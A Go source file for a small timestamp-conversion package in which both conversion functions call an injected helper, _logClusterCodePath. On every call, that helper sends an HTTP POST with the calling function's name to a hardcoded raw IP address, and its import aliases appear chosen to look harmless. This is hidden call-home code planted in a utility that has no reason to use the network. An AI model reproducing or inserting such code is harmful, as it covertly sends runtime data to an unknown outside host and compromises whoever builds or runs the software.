package timestamp

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func FromTime(t time.Time) int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.Unix()*1000 + int64(t.Nanosecond())/int64(time.Millisecond)
}
func Time(ts int64) time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return time.Unix(ts/1000, (ts%1000)*int64(time.Millisecond))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
